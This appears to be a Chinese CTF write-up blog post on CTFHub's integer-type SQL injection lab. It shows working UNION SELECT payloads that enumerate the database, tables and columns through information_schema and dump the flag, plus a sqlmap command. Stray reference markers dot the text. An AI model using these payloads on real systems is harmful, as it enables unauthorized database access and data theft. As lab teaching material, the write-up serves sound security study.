---
title: CTFHub Web - SQL 整数型注入
date: 2026-11-16
tags: [CTFHub, Web, SQL注入, 联合查询, UNION SELECT]
excerpt: 利用联合注入（UNION SELECT）分析页面回显与库表结构，从整数型参数中查出目标 flag 的完整过程。
---

## 思路

目标页面是一个新闻搜索框，输入 id 值后在页面上方回显了原生的 SQL 查询语句：`select * from news where id=6`[reference:8]。
由于参数位于 `WHERE` 子句的等号右侧且未被引号包裹，判断其为**整数型 SQL 注入**。由于页面能正常展示查询字段的对应位次，因此采用 **UNION 联合注入** 进行利用。

## 问题

1. **联合查询前置语句的干扰**：如果直接使用 `6 union select ...` ，原查询（id=6）的结果会先返回并占据页面输出，导致我们注入的查询结果无法正常显示[reference:9]。
2. **SQL 注释符兼容性**：在 MySQL/MariaDB 中，需要正确使用注释符（`#` 或 `-- `）来封闭原查询后面可能存在的代码（不过本关卡查询语句完整度高，提交 payload 无需闭合也能正常解析）。

## 解决

1. **让前置查询失效**：在输入框输入 `-6 union select 1,2` 。由于数据库中不存在 id 为 -6 的记录，前置查询为空，页面会直接回显联合查询的结果 `1` 和 `2`，确认两列数据都能正常回显[reference:10]。
2. **收集数据库信息**：
   * 查库名：`-6 union select 1,database()` ，获取当前库名为 `sqli` [reference:11]。
   * 查表名：`-6 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'` ，获取目标表名 `flag` [reference:12]。
   * 查字段名：`-6 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'` ，确认关键字段名也叫 `flag` [reference:13]。
3. **提取目标 Flag**：输入 `-6 union select 1,group_concat(flag) from sqli.flag` ，页面直接回显该字段中的所有内容，成功获取本题 Flag[reference:14]。

> **💡 复盘总结**：
> 整数型注入无需考虑单引号闭合，Payload 构造更为直接[reference:15]。`UNION` 联合注入的关键在于**让前置查询失败（如使用负数 `-6`）**，从而确保注入结果能回显。若使用工具，也可直接通过 `sqlmap -u "http://靶机地址/?id=1" --tables` 配合 `--dump` 快速获取 Flag[reference:16]。
